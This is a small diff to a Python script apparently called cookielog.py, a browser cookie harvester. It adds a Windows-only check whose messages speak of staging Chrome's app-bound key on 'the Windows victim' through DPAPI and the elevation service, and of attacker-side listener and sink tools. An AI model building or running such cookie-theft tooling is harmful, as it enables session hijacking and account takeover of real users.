@@ -177,6 +177,12 @@ def harvest(only):
     return got
 
 def main():
+    if sys.platform != "win32":
+        print("[-] cookielog.py stages the v20 app-bound key on the Windows victim")
+        print("    (DPAPI + elevation_service + ProgramData). It has no Linux mode:")
+        print("    run it on Windows; the attacker-side tools (listen.py, sink.py,")
+        print("    auto.py, pick.py) are the ones ported to Linux.")
+        return
     ap = argparse.ArgumentParser()
     ap.add_argument("--live", action="store_true")
     ap.add_argument("--firefox", action="store_true"); ap.add_argument("--chrome", action="store_true")
